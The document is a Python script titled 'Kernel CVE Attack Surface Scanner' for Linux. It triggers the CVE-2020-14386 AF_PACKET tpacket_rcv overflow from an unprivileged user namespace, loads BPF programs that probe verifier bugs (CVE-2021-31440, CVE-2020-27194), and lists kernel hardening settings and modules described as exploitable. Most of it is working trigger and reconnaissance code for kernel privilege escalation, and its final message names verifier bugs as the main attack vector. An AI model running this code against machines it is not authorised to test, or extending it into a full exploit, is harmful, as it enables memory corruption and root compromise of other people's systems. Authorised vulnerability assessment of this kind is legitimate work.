#!/usr/bin/env python3
"""CVE-2020-14386 vulnerability probe + BPF verifier probe"""
import os, socket, struct, ctypes, mmap, time, sys

def test_af_packet():
    """Test if CVE-2020-14386 (tpacket_rcv overflow) is patched"""
    print("\n=== CVE-2020-14386: AF_PACKET tpacket_rcv overflow ===")

    libc = ctypes.CDLL("libc.so.6")
    CLONE_NEWUSER = 0x10000000
    CLONE_NEWNET  = 0x40000000

    pid = os.fork()
    if pid > 0:
        _, status = os.waitpid(pid, 0)
        return

    # Child process in new namespace
    try:
        orig_uid = os.getuid()
        orig_gid = os.getgid()
        libc.unshare(CLONE_NEWUSER | CLONE_NEWNET)

        with open('/proc/self/setgroups', 'w') as f:
            f.write('deny')
        with open('/proc/self/uid_map', 'w') as f:
            f.write('0 %d 1' % orig_uid)
        with open('/proc/self/gid_map', 'w') as f:
            f.write('0 %d 1' % orig_gid)

        # Bring up lo
        import fcntl
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        SIOCSIFFLAGS = 0x8914
        ifr = struct.pack('16sH14s', b'lo', 1 | 8 | 64, b'\x00' * 14)
        fcntl.ioctl(s.fileno(), SIOCSIFFLAGS, ifr)
        s.close()

        print("[+] In user+net namespace, uid=%d" % os.getuid())

        SOL_PACKET = 263
        PACKET_VERSION = 10
        PACKET_RESERVE = 12
        PACKET_RX_RING = 5
        TPACKET_V2 = 1

        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
        sock.setsockopt(SOL_PACKET, PACKET_VERSION, struct.pack('i', TPACKET_V2))

        tp_reserve = 0xFF00  # 65280
        sock.setsockopt(SOL_PACKET, PACKET_RESERVE, struct.pack('I', tp_reserve))
        print("[+] PACKET_RESERVE = 0x%x (%d)" % (tp_reserve, tp_reserve))

        # Try ring setup: frame_size must be >= tp_hdrlen(32) + tp_reserve(65280) = 65312
        # Use frame_size = 65536 (64KB) → only 224 bytes headroom
        configs = [
            (65536, 65536, 4, 4),      # 64K frames
            (131072, 131072, 2, 2),     # 128K frames
        ]

        ok = False
        for bs, fs, bn, fn in configs:
            req = struct.pack('IIII', bs, bn, fs, fn)
            try:
                sock.setsockopt(SOL_PACKET, PACKET_RX_RING, req)
                block_size, frame_size, block_nr, frame_nr = bs, fs, bn, fn
                ok = True
                break
            except OSError as e:
                print("[-] Ring bs=%d fs=%d failed: %s" % (bs, fs, e))

        if not ok:
            print("[-] All ring configurations failed")
            os._exit(1)

        print("[+] Ring: block_size=%d frame_size=%d blocks=%d frames=%d" %
              (block_size, frame_size, block_nr, frame_nr))

        ring_size = block_size * block_nr
        ring = mmap.mmap(sock.fileno(), ring_size, mmap.MAP_SHARED,
                         mmap.PROT_READ | mmap.PROT_WRITE)

        sock.bind(('lo', 0))

        # Calculate expected offsets
        netoff = 48 + tp_reserve  # TPACKET_ALIGN(32+16) + reserve
        macoff = netoff - 14       # netoff - maclen
        print("[*] netoff=%d (0x%x) macoff=%d (0x%x)" % (netoff, netoff, macoff, macoff))
        print("[*] u16 truncated: tp_net=%d tp_mac=%d" % (netoff & 0xFFFF, macoff & 0xFFFF))

        # Send packet
        ss = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload_size = 256
        ss.sendto(b'A' * payload_size, ('127.0.0.1', 55556))
        # snaplen ≈ payload + UDP(8) + IP(20) + ETH(14) = 298
        approx_snaplen = payload_size + 42
        print("[*] Sent %d byte payload, approx snaplen=%d" % (payload_size, approx_snaplen))
        print("[*] macoff(%d) + snaplen(%d) = %d vs frame_size(%d)" %
              (macoff, approx_snaplen, macoff + approx_snaplen, frame_size))
        if macoff + approx_snaplen > frame_size:
            print("[!] *** OVERFLOW of ~%d bytes expected if unpatched ***" %
                  (macoff + approx_snaplen - frame_size))

        time.sleep(0.3)

        # Check ring for packets
        found = 0
        for i in range(frame_nr):
            off = i * frame_size
            status = struct.unpack_from('<I', ring, off)[0]
            if status != 0:
                tp_len = struct.unpack_from('<I', ring, off + 4)[0]
                tp_snaplen = struct.unpack_from('<I', ring, off + 8)[0]
                tp_mac = struct.unpack_from('<H', ring, off + 12)[0]
                tp_net = struct.unpack_from('<H', ring, off + 14)[0]
                print("[!] Frame %d: status=0x%x len=%d snaplen=%d mac=%d net=%d" %
                      (i, status, tp_len, tp_snaplen, tp_mac, tp_net))

                if tp_mac == (macoff & 0xFFFF) and macoff > 0xFFFF:
                    print("[!!!] u16 TRUNCATION CONFIRMED - KERNEL IS VULNERABLE!")
                elif tp_mac == macoff and macoff + tp_snaplen > frame_size:
                    print("[!!!] OVERFLOW WRITE OCCURRED - KERNEL IS VULNERABLE!")
                elif tp_mac < 100:
                    print("[*] tp_mac=%d looks normal - packet within bounds" % tp_mac)
                found += 1

        if not found:
            print("[-] No packets in ring -> kernel DROPPED them (PATCHED)")
            print("[-] CVE-2020-14386 is PATCHED on this kernel")
        else:
            print("[+] %d packet(s) found in ring" % found)

        ss.close()
        ring.close()
        sock.close()
    except Exception as e:
        print("[-] Error: %s" % e)
        import traceback
        traceback.print_exc()

    os._exit(0)


def test_bpf_verifier():
    """Test BPF verifier for known bugs"""
    print("\n=== BPF Verifier Bug Tests ===")

    import ctypes
    __NR_bpf = 280  # aarch64
    libc = ctypes.CDLL("libc.so.6")

    # BPF instruction format
    def bpf_insn(code, dst, src, off, imm):
        return struct.pack('<BBhI', code, (src << 4) | dst, off, imm & 0xFFFFFFFF)

    # BPF opcodes
    BPF_LD = 0x00; BPF_ST = 0x02; BPF_STX = 0x03
    BPF_ALU = 0x04; BPF_JMP = 0x05; BPF_ALU64 = 0x07
    BPF_MOV = 0xb0; BPF_ADD = 0x00; BPF_SUB = 0x10; BPF_AND = 0x40; BPF_OR = 0x40
    BPF_RSH = 0x70; BPF_LSH = 0x60
    BPF_K = 0x00; BPF_X = 0x08
    BPF_MEM = 0x60; BPF_W = 0x00; BPF_DW = 0x18
    BPF_JEQ = 0x10; BPF_JGT = 0x20; BPF_JGE = 0x30; BPF_JNE = 0x50
    BPF_JSGT = 0x60; BPF_JSGE = 0x70
    BPF_EXIT = 0x95
    BPF_CALL = 0x85

    # Helper: BPF_MAP_LOOKUP_ELEM = 1
    BPF_FUNC_map_lookup_elem = 1

    def load_bpf_prog(insns_bytes, prog_type=1):
        """Try to load a BPF program, return (fd, log)"""
        log_buf = ctypes.create_string_buffer(8192)

        # union bpf_attr for BPF_PROG_LOAD
        attr = bytearray(256)
        struct.pack_into('<I', attr, 0, prog_type)  # prog_type
        struct.pack_into('<I', attr, 4, len(insns_bytes) // 8)  # insn_cnt
        struct.pack_into('<Q', attr, 8, ctypes.addressof(ctypes.c_char.from_buffer_copy(insns_bytes)))  # insns

        # We need a proper buffer for insns
        insns_buf = ctypes.create_string_buffer(insns_bytes)
        struct.pack_into('<Q', attr, 8, ctypes.addressof(insns_buf))  # insns ptr

        license_buf = ctypes.create_string_buffer(b"GPL")
        struct.pack_into('<Q', attr, 16, ctypes.addressof(license_buf))  # license

        struct.pack_into('<I', attr, 24, 1)  # log_level
        struct.pack_into('<I', attr, 28, 8192)  # log_size
        struct.pack_into('<Q', attr, 32, ctypes.addressof(log_buf))  # log_buf

        attr_buf = ctypes.create_string_buffer(bytes(attr))
        ret = libc.syscall(__NR_bpf, 5, ctypes.addressof(attr_buf), len(attr))

        log = log_buf.value.decode('utf-8', errors='replace')
        if ret >= 0:
            return ret, log
        return -ctypes.get_errno(), log

    def create_bpf_map(map_type=2, key_size=4, value_size=8, max_entries=16):
        """Create a BPF map"""
        attr = bytearray(256)
        struct.pack_into('<I', attr, 0, map_type)  # map_type (ARRAY=2)
        struct.pack_into('<I', attr, 4, key_size)
        struct.pack_into('<I', attr, 8, value_size)
        struct.pack_into('<I', attr, 12, max_entries)

        attr_buf = ctypes.create_string_buffer(bytes(attr))
        ret = libc.syscall(__NR_bpf, 0, ctypes.addressof(attr_buf), len(attr))
        return ret

    # Test 1: Basic BPF program load
    print("[*] Test 1: Basic BPF program load")
    prog = bpf_insn(0xb7, 0, 0, 0, 0) + bpf_insn(BPF_EXIT, 0, 0, 0, 0)
    fd, log = load_bpf_prog(prog)
    if fd >= 0:
        print("[+] Basic program loaded OK (fd=%d)" % fd)
        os.close(fd)
    else:
        print("[-] Basic program failed: errno=%d" % (-fd))
        print("[-] Log: %s" % log[:200])
        return

    # Test 2: ALU32 operations (CVE-2021-31440 related)
    print("\n[*] Test 2: ALU32 bounds tracking (CVE-2021-31440)")
    # This tests if the verifier properly tracks 32-bit ALU operations
    # The bug: after BPF_ALU (32-bit), verifier may not properly bound
    # the 64-bit register, allowing OOB map access

    map_fd = create_bpf_map(2, 4, 256, 16)  # ARRAY map
    if map_fd < 0:
        print("[-] Map creation failed")
        return
    print("[+] BPF array map created (fd=%d)" % map_fd)

    # Test 3: Scalar value tracking with OR
    print("\n[*] Test 3: Scalar OR tracking (CVE-2020-27194 style)")
    # Load r0=0, OR with large immediate, check if verifier tracks bounds
    prog = b''
    prog += bpf_insn(0xb7, 0, 0, 0, 0)   # r0 = 0
    prog += bpf_insn(0xb7, 1, 0, 0, 1)   # r1 = 1
    # r0 |= 0x7FFFFFFF (ALU64 OR imm)
    prog += bpf_insn(0x47, 0, 0, 0, 0x7FFFFFFF)  # r0 |= 0x7FFFFFFF
    # r0 &= 0xFF (should bound to 0-255)
    prog += bpf_insn(0x57, 0, 0, 0, 0xFF)  # r0 &= 0xFF
    prog += bpf_insn(BPF_EXIT, 0, 0, 0, 0)

    fd, log = load_bpf_prog(prog)
    if fd >= 0:
        print("[+] OR+AND program loaded")
        os.close(fd)
    else:
        print("[-] OR+AND program rejected (verifier might be strict)")
    if log:
        # Show verifier bounds tracking
        for line in log.split('\n'):
            if 'R0' in line and ('umax' in line or 'umin' in line or 'scalar' in line):
                print("    %s" % line.strip())

    # Test 4: Try to detect verifier version/strictness
    print("\n[*] Test 4: Verifier strictness probe")
    # Try loading a program with known-tricky patterns
    # BPF_MOV32 + BPF_ALU64: if verifier doesn't zero-extend properly
    prog = b''
    prog += bpf_insn(0xb7, 0, 0, 0, 0)            # r0 = 0 (64-bit)
    prog += bpf_insn(0xb4, 1, 0, 0, 0xFFFFFFFF)    # w1 = 0xFFFFFFFF (32-bit mov)
    # After this, r1 should be 0x00000000FFFFFFFF (zero-extended)
    # But buggy verifiers might think r1 is still 0xFFFFFFFFFFFFFFFF
    prog += bpf_insn(0xb7, 2, 0, 0, 1)             # r2 = 1
    prog += bpf_insn(0x2d, 1, 2, 1, 0)             # if r1 > r2 goto +1
    prog += bpf_insn(BPF_EXIT, 0, 0, 0, 0)         # exit
    prog += bpf_insn(0xb7, 0, 0, 0, 1)             # r0 = 1
    prog += bpf_insn(BPF_EXIT, 0, 0, 0, 0)         # exit

    fd, log = load_bpf_prog(prog)
    if fd >= 0:
        print("[+] ALU32 zero-extension test loaded (fd=%d)" % fd)
        os.close(fd)
    else:
        print("[-] ALU32 test rejected: %d" % (-fd))

    # Show relevant verifier log
    if log:
        lines = log.split('\n')
        for line in lines:
            if 'w1' in line.lower() or 'r1' in line.lower() or 'R1' in line:
                print("    %s" % line.strip()[:120])

    os.close(map_fd)

    print("\n[*] BPF verifier testing complete")
    print("[*] Key finding: unprivileged BPF works → verifier bugs are the primary attack vector")


def test_additional():
    """Check other CVE vectors"""
    print("\n=== Additional CVE Surface ===")

    # Check /proc/sys values
    checks = [
        ('/proc/sys/kernel/unprivileged_bpf_disabled', 'Unprivileged BPF'),
        ('/proc/sys/kernel/perf_event_paranoid', 'Perf paranoid'),
        ('/proc/sys/vm/unprivileged_userfaultfd', 'Unprivileged userfaultfd'),
        ('/proc/sys/kernel/dmesg_restrict', 'dmesg restrict'),
        ('/proc/sys/kernel/kptr_restrict', 'kptr restrict'),
        ('/proc/sys/fs/protected_symlinks', 'Protected symlinks'),
        ('/proc/sys/fs/protected_hardlinks', 'Protected hardlinks'),
    ]
    for path, name in checks:
        try:
            with open(path) as f:
                val = f.read().strip()
            print("[*] %s = %s" % (name, val))
        except:
            print("[-] %s: not available" % name)

    # Check for exploitable modules
    print("\n[*] Checking loadable kernel modules:")
    try:
        with open('/proc/modules') as f:
            for line in f:
                name = line.split()[0]
                if any(x in name for x in ['packet', 'bpf', 'netfilter', 'nf_', 'xt_',
                                             'binder', 'ashmem', 'vsock', 'dccp', 'sctp',
                                             'kgsl', 'ion']):
                    print("  %s" % line.strip()[:80])
    except:
        pass

    # Check AF_NETLINK
    print("\n[*] AF_NETLINK test:")
    try:
        s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 15)  # NETLINK_KOBJECT_UEVENT
        print("[+] AF_NETLINK works")
        s.close()
    except Exception as e:
        print("[-] AF_NETLINK: %s" % e)


if __name__ == '__main__':
    print("=" * 50)
    print("Kernel CVE Attack Surface Scanner")
    print("=" * 50)
    print("uid=%d euid=%d" % (os.getuid(), os.geteuid()))

    sys.stdout.flush()
    test_af_packet()
    sys.stdout.flush()
    test_bpf_verifier()
    sys.stdout.flush()
    test_additional()

    print("\n" + "=" * 50)
    print("Scan complete")
    print("=" * 50)
